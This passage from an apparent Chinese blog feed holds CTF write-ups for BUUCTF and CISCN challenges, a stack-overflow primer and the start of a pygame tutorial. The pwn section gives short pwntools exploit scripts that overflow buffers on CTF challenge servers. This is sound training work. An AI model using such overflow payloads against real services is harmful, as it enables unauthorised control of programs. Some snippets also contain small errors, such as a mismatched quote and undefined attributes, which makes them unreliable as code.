        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU MISC刷题记录</title>
      <link href="/post/BUU-MISC%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.html"/>
      <url>/post/BUU-MISC%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.html</url>
      
        <content type="html"><![CDATA[<h1 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h1><p>下载附件，打开是gif，仔细看发现gif会闪现一些字符，通过利用Stegsolve或者PS逐帧分析合并就可得到flag</p><p><img src="https://i.loli.net/2021/05/31/ZtEXme1fY8UwHIh.png" alt="image.png"></p><h1 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h1><p>在线扫码，得到secret is here<img src="https://i.loli.net/2021/05/31/Epm1lNvPsoIa8Xj.png" alt="image.png"></p><p>用winhex打开发现图片里面藏了压缩包，压缩包里面有一个4number.txt文件<img src="https://i.loli.net/2021/05/31/a7PysrT9jidQIxD.png" alt="image.png"></p><p>利用binwalk分离得到一个加密的文件，4number应该是提示，提示密码只有四位数，直接爆破得到密码，打开flag<img src="https://i.loli.net/2021/05/31/8gVBjHrO3ZCDJqy.png" alt="image.png"></p><h1 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h1><p>附件是exe文件，无法直接运行，拖进winhex里面发现是十六进制是base64编码的图片，解码得到二维码，扫码得到flag<img src="https://i.loli.net/2021/05/31/F2RNhSZXUWYTDt4.png" alt="image.png"></p><h1 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h1><p>题目给了提示，是不是屏幕太小了，再看看附件，发现高度明显有问题，直接修改高度得到flag<img src="https://i.loli.net/2021/05/31/PFhSz3gIAQYWTVy.png" alt="image.png"></p><h1 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h1><p>签到题，将附件拖进winhex，在最下面发现flag</p><h1 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h1><p>提示密码是四位数，直接爆破，得到密码，打开发现内容被加密，猜测是base64<img src="https://i.loli.net/2021/05/31/GlDCamAKp9hgwrq.png" alt="image.png"></p><p>base64解码得到flag</p><p><img src="https://i.loli.net/2021/05/31/37SVqiBK9oNsehD.png" alt="image.png"></p><h1 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h1><p>签到题，拖进winhex拉到最底下就可以看到flag<img src="https://i.loli.net/2021/05/31/wyGEb3q8SR9fsNC.png" alt="image.png"></p><h1 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h1><p>根据题目名，<strong>LSB</strong>（Least Significant Bit），意为最低有效位；<strong>MSB</strong>（Most Significant Bit），意为最高有效位。使用Stegsolve<img src="https://i.loli.net/2021/05/31/c5A3vWR4oG8rhdN.png" alt="image.png"></p><p>保存，发现是一个二维码，扫码得到flag</p><h1 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h1><p>拖进winhex，使用binwalk没有发现什么东西，打开照片属性里面发现备注有flag<img src="https://i.loli.net/2021/05/31/RyiONSDtKWF62Ap.png" alt="image.png"></p><h1 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h1><p>根据提示爆破，得到密码打开就是flag</p><p><img src="https://i.loli.net/2021/05/31/P6Lf4htqcjn2sSx.png" alt="image.png"></p><h1 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h1><p>签到题，扫码得到flag</p><h1 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h1><p>看名字就知道是伪加密，拖进winhex，修改后直接打开就能得到flag<img src="https://i.loli.net/2021/06/01/FRcYDGbkQBosrCX.png" alt="image.png"></p><h1 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h1><p>将文件丢进winhex，拖到最后可以看到照片里面藏了压缩包，还有一个txt文件<img src="https://i.loli.net/2021/06/01/eojuyRpP7OiG2Wc.png" alt="image.png"></p><p>直接修改后缀名，发现一个加密txt文件，根据题目提示爆破得到密码，打开文件得到flag<img src="https://i.loli.net/2021/06/01/TMgPCG619qeyc3h.png" alt="image.png"></p><h1 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h1><p>使用winhex没有发现什么东西，看到文件名盲猜使用<strong>Stegsolve</strong>修改最低有效位，果然，得到flag<img src="https://i.loli.net/2021/06/01/I5mDvbVouFsScM2.png" alt="image.png"></p><h1 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h1><p>拖进winhex，在文件最后发现有个2.txt文件，猜测里面藏了压缩包，使用binwalk分离，得到压缩包<img src="https://i.loli.net/2021/06/01/4l3ZFYtepU6azSI.png" alt="image.png"></p><p>根据提示进行爆破得到flag<img src="https://i.loli.net/2021/06/01/QHAnOD1pta6ld9o.png" alt="image.png"></p><h1 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h1><p>拖进winhex，发现里面藏有压缩包，直接改后缀名，尝试了一下，发现不是伪加密，返回照片查看，在属性备注里面发现密码，改成zip就可以看到flag了</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出</title>
      <link href="/post/%E6%A0%88%E6%BA%A2%E5%87%BA.html"/>
      <url>/post/%E6%A0%88%E6%BA%A2%E5%87%BA.html</url>
      
        <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是</p><ul><li>程序必须向栈上写入数据。</li><li>写入的数据大小没有被良好地控制。</li></ul><h1 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>首先查看附件，发现没开什么保护，丢进IDA里面看一下</p><p><img src="https://i.loli.net/2021/05/23/vPpXGYRlquMrOWh.png" alt="image.png"></p><p>发现可疑函数（fun），点进去可以发现函数调用了/bin/sh，接下来我们可以利用这个函数得到flag<img src="https://i.loli.net/2021/05/23/Gzj4Jyef3P9tLq2.png" alt="image.png"></p><p>开始调试。首先创造一个长度为150的字符串，运行该附件，将那个字符串输入进去<img src="https://i.loli.net/2021/05/23/WvfGUnBq1NhFZjQ.png" alt="image.png"></p><p>之后程序直接报错，因为return地址处不是一个正确的地址值，无法跳转。通过return的那个地址值，我们可以计算return距离输入点的长度。使用cyclic计算偏移量<img src="https://i.loli.net/2021/05/23/odKI89vOWRDAuEZ.png" alt="image.png"></p><p>得到偏移量就可以写exp了</p><h2 id="编写EXP"><a href="#编写EXP" class="headerlink" title="编写EXP"></a>编写EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28652</span>)</span><br><span class="line">fun = <span class="number">0x401186</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">23</span>+p64(fun+<span class="number">1</span>)  //平衡堆栈</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>也是一个简单的栈溢出，思路还是一样的，先查看保护，还是什么保护都没有开<img src="https://i.loli.net/2021/05/24/rCDanMEpmvbN28R.png" alt="image.png"></p><p>丢进IDA查看，就是输出两个语句和一个函数地址，查看函数，发现是打开flag文件。思路立刻就有了，因为是gets函数没有限制输入，所以可以通过栈溢出来获得flag。所以，接下来要计算偏移量<img src="https://i.loli.net/2021/05/24/bA1kDTgImdNEpc2.png" alt="image.png"></p><p>还是和上面一题一样的方法计算偏移量</p><p><img src="https://i.loli.net/2021/05/24/1oBRpDXmTdVPvru.png" alt="image.png"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26972</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x40060D</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>老规矩，先检查开了什么保护，发现只开了NX，其它没有开，也就是数据段不可执行<img src="https://i.loli.net/2021/05/25/smzhw5ZEVCYNP4W.png" alt="image.png"></p><p>扔进IDA查看，也就是调用了func函数，点进func函数，函数先是将用户输入的值赋予给v1，之后判断v2是否等于11.28125，如果等于就可以得到flag，所以思路就是计算v1和v2相差多少，再利用gets函数将v2覆盖为11.28125<img src="https://i.loli.net/2021/05/25/wFnCVTSrxtgHf2i.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/05/25/nxwgLFy6OBIJueS.png" alt="image.png"></p><p>因为11.28125在内存中是以十六进制存储，所以要将11.28125转成十六进制</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25675</span>)</span><br><span class="line">payload = ‘a<span class="string">&#x27; *(0x30-0x4) + p64(0x41348000)</span></span><br><span class="line"><span class="string">p.sendline(payload)</span></span><br><span class="line"><span class="string">p.interactive()</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 积累 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN复现</title>
      <link href="/post/CISCN%E5%A4%8D%E7%8E%B0.html"/>
      <url>/post/CISCN%E5%A4%8D%E7%8E%B0.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>初次参加这种大型比赛，给我的感觉就是题目出的挺不错（一题都没做出来），但是这个比赛形式着实令人不解。不仅如此，在写完选择题后系统崩溃也是我没想得到（虽然没有停滞很久，但是感觉很意外，毕竟是国赛）。</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="隔空传话"><a href="#隔空传话" class="headerlink" title="隔空传话"></a>隔空传话</h2><p>附件是一个txt文件，里面全是十六进制码，根据题目搜索发现是<a href="http://www.sendsms.cn/pdu/"><strong>PDU编码解码</strong></a>，解码发现前面四行得到有用的信息：flag前面一部分是15030442和w465。而后面则是一堆十六进制码，但是发现在第一行十六进制码的开头几个十六进制码正好是png十六进制文件头，猜测这些应该是png图片的十六进制码，利用脚本将其导出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开读取data.txt文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;../data.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">data = data.splitlines()[<span class="number">4</span>:]  <span class="comment"># 前四条不是十六进制</span></span><br><span class="line"><span class="comment"># 启动谷歌</span></span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">url = <span class="string">&quot;http://www.sendsms.cn/pdu/&quot;</span></span><br><span class="line">browser.get(url)</span><br><span class="line">output = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 用于接收结果</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    browser.find_element_by_name(<span class="string">&quot;smsText2&quot;</span>).clear()  <span class="comment"># 清空转换框里面的内容</span></span><br><span class="line">    browser.find_element_by_name(<span class="string">&quot;smsText2&quot;</span>).send_keys(i)  <span class="comment"># 输入要翻译的内容</span></span><br><span class="line">    browser.find_element_by_xpath(<span class="string">&quot;//input[@name=&#x27;checkButton&#x27;]&quot;</span>).click()  <span class="comment"># 点击翻译</span></span><br><span class="line">    recv = browser.find_element_by_name(<span class="string">&quot;smsOut&quot;</span>).get_attribute(<span class="string">&#x27;value&#x27;</span>)  <span class="comment"># 获取翻译内容</span></span><br><span class="line">    recv = recv.split()  <span class="comment"># 将获得内容按空格分开</span></span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    txt = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> recv:  <span class="comment"># 读取需要的信息</span></span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">3</span>:  <span class="comment"># 获取时间戳</span></span><br><span class="line">            txt += j</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">13</span>:</span><br><span class="line">            txt += j  <span class="comment"># 获取十六进制码</span></span><br><span class="line">            txt += <span class="string">&#x27;\n&#x27;</span>  <span class="comment"># 分行</span></span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line">    output += txt</span><br><span class="line">browser.quit()  <span class="comment"># 退出浏览器</span></span><br><span class="line">output = output.splitlines()</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">time = []</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> output:  <span class="comment"># 按时间戳进行排序</span></span><br><span class="line">    time.append(<span class="built_in">int</span>(i[<span class="number">3</span>:<span class="number">5</span>]) * <span class="number">60</span> + <span class="built_in">int</span>(i[<span class="number">6</span>:<span class="number">8</span>]) - <span class="number">1800</span>)</span><br><span class="line">    data.append(i[<span class="number">8</span>:])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1200</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        <span class="keyword">if</span> i == time[j]:</span><br><span class="line">            result += data[j]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:  <span class="comment"># 将结果保存到out.txt文件中</span></span><br><span class="line">    f.write(result)</span><br></pre></td></tr></table></figure><p>之后导出图片，发现图片乱七八糟，想到之前w465应该是width465转成十六进制码就是1D1，得到图片</p><p><img src="https://i.loli.net/2021/05/18/du2PwMJRpSQLDyW.png" alt="未命名_1_.png"></p><p>结合前面得到flag：CISCN{15030442_b586_4c9e_b436_26def12293e4}</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pygame使用</title>
      <link href="/post/pygame%E4%BD%BF%E7%94%A8.html"/>
      <url>/post/pygame%E4%BD%BF%E7%94%A8.html</url>
      
        <content type="html"><![CDATA[<blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>了解，学习一个第三方模块，最好是去官网学习，因为官方有第一手资料，而在其他人手里则是第二手，使用要学好还是得去<a href="https://www.pygame.org/wiki/GettingStarted">官网</a>。在这里我就直接拿实例讲pygame</p></blockquote><h1 id="安装pygame-windows"><a href="#安装pygame-windows" class="headerlink" title="安装pygame (windows)"></a>安装pygame (windows)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install -U pygame --user</span><br></pre></td></tr></table></figure><p>可能的报错：</p><ul><li>输入python可能会报错，改成python3</li><li>无法下载，检查网络是否正常，确认无误还是无法下载，查看是否使用了梯子，如果使用就关闭。</li></ul><h1 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h1><p>设计一个游戏必须先有思路，这里我引用了一个大佬的图片，基本思路差不多，接下来就根据这个思路开始设计这个游戏</p><p><img src="https://i.loli.net/2021/05/12/jgWlDs5pc1rQUVN.png" alt="图片链接https://blog.csdn.net/weixin_45634606/article/details/105574019"></p><p>首先，在设计时要明确游戏有哪些元素，从而创建对应的类。在飞机大战中，要创建以下几个类：</p><ul><li><p>用于管理游戏资源和行为的类（我是将它放在alien_invasion.py文件中，作为游戏的入口）</p></li><li><p>存储游戏设置的类（settings.py）</p></li><li><p>存储飞机的类（ship.py）</p></li><li><p>存储子弹的类（bullet.py）</p></li><li><p>存储敌机的类（Alien.py）</p></li><li><p>存储游戏初始数据的类（game_stats.py）</p></li><li><p>存储得分的类（scoreboard.py）</p></li><li><p>存储初始游戏界面的类（bottom.py）</p><h1 id="alien-invasion-py"><a href="#alien-invasion-py" class="headerlink" title="alien_invasion.py"></a>alien_invasion.py</h1><p>首先要初始化要显示的窗口或屏幕</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AlienInvasion</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span>                            </span><br><span class="line">        pygame.init()                                                                                   <span class="comment">#pygame.init()安全地初始化了所有导入的pygame模块</span></span><br><span class="line">        self.screen = pygame.display.set_mode((<span class="number">1200</span>,<span class="number">800</span>))         <span class="comment">#初始屏幕，1200是屏幕宽度，800是屏幕高度</span></span><br><span class="line">        pygame.display.set_caption(<span class="string">&quot;Alien Invasion&quot;</span>)                      <span class="comment">#在屏幕边框上面添加游戏名Alien Invasion</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_game</span>(<span class="params">self</span>):</span>                                                                         <span class="comment">#游戏主循环，让游戏不断持续下去</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">                <span class="keyword">if</span> event.<span class="built_in">type</span> == pygame.QUIT:                                          <span class="comment"># 如果用户输入q游戏就结束</span></span><br><span class="line">                    sys.exit()</span><br><span class="line">            pygame.display.flip()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    ai = AlienInvasion()</span><br><span class="line">    ai.run_game()</span><br></pre></td></tr></table></figure><p><strong>相关代码解释</strong>：</p><p>**if __ name __ == ‘ __ main <strong>： ‘**：</strong> name __ 是当前模块名，当模块被直接运行时模块名为 __ main __ 。这句话的意思就是，当模块被直接运行时，以下代码块将被运行，当模块是被导入时，代码块不被运行。（如果还是有疑惑查看<a href="https://www.sohu.com/a/426575177_671965">链接</a>）</p><p><strong>for event in pygame.event.get()：</strong>Pygame会接受用户的各种操作（比如按键盘，移动鼠标等）产生事件，事件随时可能发生，而且量也可能会很大，Pygame的做法是把一系列的事件存放一个队列里，逐个的处理。这行代码就是将事件逐一读取。</p><h1 id="settings-py"><a href="#settings-py" class="headerlink" title="settings.py"></a>settings.py</h1><p>存储游戏元素属性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Settings</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.screen_width = <span class="number">1200</span>                 <span class="comment">#屏幕宽度</span></span><br><span class="line">        self.screen_height = <span class="number">600</span>                 <span class="comment">#屏幕高度</span></span><br><span class="line">        self.bg_color = (<span class="number">230</span>, <span class="number">230</span>, <span class="number">230</span>)      <span class="comment">#背景颜色</span></span><br><span class="line">        self.ship_speed = <span class="number">1.5</span>                      <span class="comment">#飞船移动速度</span></span><br><span class="line">        self.bullet_speed = <span class="number">1.5</span>               <span class="comment">#子弹速度</span></span><br><span class="line">        self.bullet_width = <span class="number">3</span>                  <span class="comment">#子弹宽度</span></span><br><span class="line">        self.bullet_height = <span class="number">15</span>                 <span class="comment">#子弹长度</span></span><br><span class="line">        self.bullet_color = (<span class="number">60</span>,<span class="number">60</span>,<span class="number">60</span>)        <span class="comment">#子弹颜色</span></span><br><span class="line">        self.bullet_allowed = <span class="number">5</span>                <span class="comment">#子弹数量</span></span><br><span class="line">        self.alien_speed = <span class="number">1.0</span>                 <span class="comment">#外星人移动速度</span></span><br><span class="line">        self.fleet_drop_speed = <span class="number">10</span>           <span class="comment">#外星人设置</span></span><br><span class="line">        self.fleet_direction = <span class="number">1</span>               <span class="comment">#1是右移，-1是左移动</span></span><br><span class="line">        self.ship_limit = <span class="number">3</span>                           <span class="comment">#设置生命次数</span></span><br><span class="line">        self.speedup_scale = <span class="number">1.1</span>               <span class="comment">#游戏运行的速度</span></span><br><span class="line">        self.score_scale = <span class="number">1.5</span>                    <span class="comment">#根据游戏速度提高外星人的分数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">initialize_dynamic_settings</span>(<span class="params">self</span>):</span>                              <span class="comment">#初始化在整个游戏中更改的设置</span></span><br><span class="line">        self.ship_speed = <span class="number">1.5</span>                                                         <span class="comment">#飞船移动速度</span></span><br><span class="line">        self.bullet_speed = <span class="number">3.0</span>                                                     <span class="comment">#子弹移动速度</span></span><br><span class="line">        self.alien_speed = <span class="number">1.0</span>                                                       <span class="comment">#外星人移动速度</span></span><br><span class="line">        self.fleet_direction = <span class="number">1</span>                                                       <span class="comment">#外星人移动方向</span></span><br><span class="line">        self.alien_points = <span class="number">50</span>                                                         <span class="comment">#每个外星人的分数</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">increase_speed</span>(<span class="params">self</span>):</span>                                                                       <span class="comment">#提高速度设置和外星人分数</span></span><br><span class="line">        self.ship_speed *= self.speedup_scale</span><br><span class="line">        self.bullet_speed *= self.speedup_scale</span><br><span class="line">        self.alien_speed *= self.speedup_scale</span><br><span class="line"></span><br><span class="line">        self.alien_points = <span class="built_in">int</span>(self.alien_points * self.score_scale)</span><br></pre></td></tr></table></figure><h1 id="ship-py"><a href="#ship-py" class="headerlink" title="ship.py"></a>ship.py</h1></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Plane</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,ai_game</span>):</span></span><br><span class="line">        <span class="comment"># 初始化小飞机并设置其初始位置</span></span><br><span class="line">        self.screen = ai_game.screen                                                              <span class="comment">#加载图像，并获得其矩形区域</span></span><br><span class="line">        self.settings = ai_game.settings                                                         <span class="comment">#读取设置里面的信息</span></span><br><span class="line">        self.img_plane = pygame.image.load(<span class="string">&quot;images/ship.bmp&quot;</span>)          <span class="comment">#加载飞船照片</span></span><br><span class="line">        self.screen_rect = ai_game.screen.get_rect()                              <span class="comment">#得到飞船的的矩形区域</span></span><br><span class="line">        self.screen_rect = self.screen.get_rect()                                        <span class="comment">#得到screen的矩形区域</span></span><br><span class="line">        self.rect.midbottom = self.screen_rect.midbottom                      <span class="comment"># 将飞船放到底部中央</span></span><br><span class="line">        self.x = <span class="built_in">float</span>(self.rect.x)                                                                        <span class="comment">#存储飞机的位置</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">blitme</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 在指定位置绘制小飞机</span></span><br><span class="line">        self.screen.blit(self.image, self.rect)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">self</span>):</span>                                                                                                       <span class="comment">#根据运动标记更新飞船的位置</span></span><br><span class="line">        <span class="keyword">if</span> self.moving_right <span class="keyword">and</span> 